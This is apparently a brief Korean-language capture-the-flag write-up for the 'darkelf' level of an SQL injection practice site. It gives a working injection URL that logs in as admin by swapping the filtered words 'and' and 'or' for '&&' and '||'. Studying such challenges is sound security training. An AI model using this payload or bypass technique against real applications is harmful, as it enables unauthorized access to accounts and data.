# Payload
```text
https://los.rubiya.kr/chall/darkelf_c6a5ed64c4f6a7a5595c24977376136b.php?pw=0' || id='admin' -- '
```
- 공백은 필터링하지 않는다.
- 다만 `and`, `or` 문자를 필터링 하기 때문에 이것을 우회해야 한다.
	- `and`는 `&&`로, `or`은 `||`로 대체 가능하다.
- 이번 문제도 정확한 pw를 요구하지는 않는다.
